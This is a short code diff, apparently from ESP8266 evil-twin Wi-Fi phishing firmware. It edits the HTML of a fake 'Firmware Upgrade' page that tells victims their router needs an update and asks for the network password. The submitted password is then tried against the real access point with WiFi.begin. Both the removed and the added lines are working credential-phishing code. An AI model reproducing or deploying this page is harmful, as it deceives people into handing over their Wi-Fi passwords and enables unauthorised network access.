@@ -198,7 +198,7 @@ void handleIndex() {
       WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
       webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Password checking, please wait...</h2></body> </html>");
     } else {
-      webServer.send(200, "text/html", "<!DOCTYPE html> <html> <h2 style="color:Blue">Firmware Upgrade</h2> <p>A new version of the ROUTER has been detected and awaiting installation.</p> <p> To verify your ownership of '" + _selectedNetwork.ssid + "' , please fill the section below</p> <form action='/'> <label for='password'>Password:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Submit'> </form> <p>*All Terms And Conditions Applied*</p> <p>*All Rights Reserved*</p> </html>");
+      webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Firmware Upgrade</h2> <p>A new version of the ROUTER has been detected and awaiting installation.</p> <p> To verify your ownership of '" + _selectedNetwork.ssid + "' , please fill the section below</p> <form action='/'> <label for='password'>Password:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Submit'> </form> <p>*All Terms And Conditions Applied*</p> <p>*All Rights Reserved*</p> </body> </html>");
     }
   }
 
